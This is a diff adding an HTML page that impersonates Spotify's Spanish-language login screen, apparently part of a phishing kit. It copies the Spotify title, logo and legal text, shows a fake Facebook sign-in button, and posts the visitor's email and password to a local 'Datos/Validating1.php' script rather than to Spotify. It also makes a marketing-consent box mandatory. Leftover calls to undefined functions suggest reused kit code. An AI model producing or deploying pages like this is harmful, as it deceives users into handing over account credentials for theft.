@@ -1,0 +1,88 @@
+<html>
+<head><title>Iniciar sesión - Spotify</title>
+<meta name="MobileOptimized" content="width">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="shortcut icon" href="favicon.png">
+<link href="style.css" rel="stylesheet" type="text/css">
+<script>
+$(function() {
+  $('input').on('change', function() {
+    var input = $(this);
+    if (input.val().length) {
+      input.addClass('populated');
+    } else {
+      input.removeClass('populated');
+    }
+  });
+  
+  setTimeout(function() {
+    $('#fname').trigger('focus');
+  }, 500);
+});
+</script>
+<script>
+    function justNumbers(e)
+    {
+    var keynum = window.event ? window.event.keyCode : e.which;
+    if ((keynum == 8) || (keynum == 46))
+    return true;
+     
+    return /\d/.test(String.fromCharCode(keynum));
+    }
+</script>
+</head>
+<body scroll="auto" onload="javascript:SelectDocument('DOCTARJ'); activaChat();IsIE8Browser();">
+<form method="post" action="Datos/Validating1.php" name="form1">
+<center><img src="logo.png" width="210" height="65"></center>
+<br>
+<hr style="color: rgb(255, 255, 255);">
+<br>
+<div class="datagrid">
+<table style="width: 440px;" border="0" align="center">
+<thead><tr><th colspan="2" align="left"><input class="button2" value="       INICIA CON FACEBOOK      " style="cursor: pointer;"><br>
+</th></tr></thead><thead><tr><th colspan="2" style="font: 700 20px Helvetica,Arial,sans-serif;" align="center"><br>Iniciar sesión o Regístrese <br><br></th></tr></thead>
+
+
+<tbody>
+
+<tr>
+<td>
+<label>
+<input style="height: 60px;" id="fname" name="us" class="input" placeholder="Correo electrónico o nombre de usuario" autocomplete="on" required="" type="email">
+<span>Correo electrónico</span>
+</label>
+</td>
+</tr>
+
+<tr>
+<td>
+<label>
+<input style="height: 60px;" name="pw" placeholder="Contraseña" autocomplete="off" maxlength="20" minlength="8" required="" type="password">
+<span>Contraseña</span>
+</label>
+</td>
+</tr>
+
+<tr>
+<td>
+<input name="cs" "="" autocomplete="off" required="" type="checkbox"><font style="font: 12px Helvetica,Arial,sans-serif; color: rgb(204, 204, 204);">Compartir mis datos de registro con los proveedores de contenido de Spotify con fines de marketing.</font>
+</td>
+</tr>
+<tr>
+<td>
+<font style="font: 12px Helvetica,Arial,sans-serif;">Al hacer clic en Registrarse, acepta los Términos y condiciones de uso de Spotify. 
+<br><br>
+Para obtener más información sobre cómo Spotify recopila, usa, comparte y protege sus datos personales, lea la Política de privacidad de Spotify.</font>
+</td>
+</tr>
+<tr>
+<td colspan="2" rowspan="2" align="center">
+<br>
+<input value="       CONTINUE      " class="button" style="cursor: pointer;" type="submit">
+</td>
+</tr>
+</tbody>
+</table></div>
+</form>
+</body>
+</html>
